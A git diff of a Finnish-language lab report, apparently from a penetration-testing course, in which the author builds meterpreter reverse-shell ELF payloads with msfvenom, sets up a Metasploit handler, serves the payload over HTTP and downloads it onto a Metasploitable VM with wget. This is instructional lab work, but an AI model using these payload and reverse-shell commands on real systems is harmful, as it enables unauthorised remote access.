@@ -390,7 +390,7 @@ Navigoin itseni /usr/bin, jossa msfvenom sijaitsee ja katselin aikani ```msfveno
 
 - Kokeilin [tämän](https://raxis.com/blog/cool-tools-series-msfvenom/) ohjeen mukaan suorittaa komennon ```msfvenom -p linux/x64/meterpreter_reverse_http LHOST=(omaip) LPORT=8080 (HTTP-PORTTI) -f exe > ~/Desktop/File.exe```
 - Se herjaa, että vain elf - fileja voi luoda
-- Eli vaihdoin sen ```sudo msfvenom -p linux/x64/meterpreter_reverse_http LHOST=(omaip) LPORT=8080 (HTTP-PORTTI) -f elf -o payload.elf
+- Eli vaihdoin sen ```sudo msfvenom -p linux/x64/meterpreter_reverse_http LHOST=(omaip) LPORT=8080 (HTTP-PORTTI) -f elf -o payload.elf```
 
 ![image](https://github.com/user-attachments/assets/05068cd6-8dff-4dd5-8af4-f54b4f717348)
 
@@ -398,7 +398,7 @@ Seurailin vähän [ohjetta](https://www.beyondtrust.com/blog/entry/how-to-use-me
 
 ![image](https://github.com/user-attachments/assets/9965adfe-d957-46c3-a6a4-416266420ce1)
 
-Kuten näkyy, käytösä olisi shell_reverse_tcp, mutta halutaan se http, joten muokkaillaan niitä. Voi käytännössä copypasteta aikaisemmista komennoista, jos ei ole tyhjentänyt komentoja välissä
+Kuten näkyy, käytössä olisi shell_reverse_tcp, mutta halutaan se http, joten muokkaillaan niitä. Voi käytännössä copypasteta aikaisemmista komennoista, jos ei ole tyhjentänyt komentoja välissä
 
 ```
 set payload (haluttu)
@@ -410,6 +410,28 @@ exploit -j
 Nyt hetken pohdin, et miten saan sen payloadin tuonne metasploitableen ja tuli mieleen [video](https://www.youtube.com/watch?v=ZqWfDrD2WVY), jonka näin aiemmin
 
 - Eli ```python3 -m http.server```
+- Käytin ensin curl ```http://192.168.118.3/payload.elf```, mutta siitähän tuli vain kasa symboleita 3 - minuuttia putkeen
+- Sitten ```wget http://192.168.118.3/payload.elf```ja sain sen onnistuneesti perille, mutta multi/handler ei sanonut mitään
+
+- Toinen ongelma -> payload oli 64 - bittiselle, vaikka kyseinen metasploitable käyttää 32. Ihmettelin, kun "cannot execute binary file", mutta siitähän se johtui.
+
+![image](https://github.com/user-attachments/assets/64c8a50a-8584-4257-ae30-eeec9a0f9fac)
+
+Pitää siis käyttää tätä:
+
+![image](https://github.com/user-attachments/assets/c47e588c-9b80-42c0-9947-97e2cce0fa55)
+
+
+Kertaus on opintojen äiti:
+
+```sudo msfvenom -p /linux/x86/meterpreter/reverse_tcp LHOST=192.168.118.3 LPORT=8080 -f elf -o payload.elf
+msfconsole
+set payload
+set LHOST
+set LPORT
+```
+
+Uus yritys
 
 
 ## Lähteet: 
